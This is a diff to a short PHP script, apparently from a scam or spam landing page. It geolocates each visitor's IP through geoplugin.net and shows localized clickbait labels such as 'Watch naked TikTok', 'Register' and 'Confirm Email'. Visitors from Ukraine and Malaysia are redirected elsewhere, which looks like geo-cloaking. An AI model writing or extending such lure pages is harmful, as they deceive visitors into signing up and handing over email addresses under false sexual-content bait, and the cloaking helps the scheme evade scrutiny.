@@ -1,10 +1,10 @@
 <?php 
 
-$lang =  substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 3, 2);
-// $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
+// $lang =  substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 3, 2);
+$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['HTTP_CF_CONNECTING_IP']));
 
 
-switch ($lang) {
+switch ($ipdat->geoplugin_countryCode) {
     case 'FR':
         $register = 'S\'inscrire'; $confirm = 'Confirmez votre e-mail'; $see = 'Regarder nu TikTok';
         break;
@@ -37,6 +37,9 @@ switch ($lang) {
         break;
     case 'UA':
         exit(header("location: $redirect"));
+        break;
+    case 'MY':
+        exit(header("location: https://www.youtube.com/watch?v=FTu_ndnh-wc"));
         break;
     default:
         $register = 'Register'; $confirm = 'Confirm Email'; $see = 'Watch naked TikTok'; 
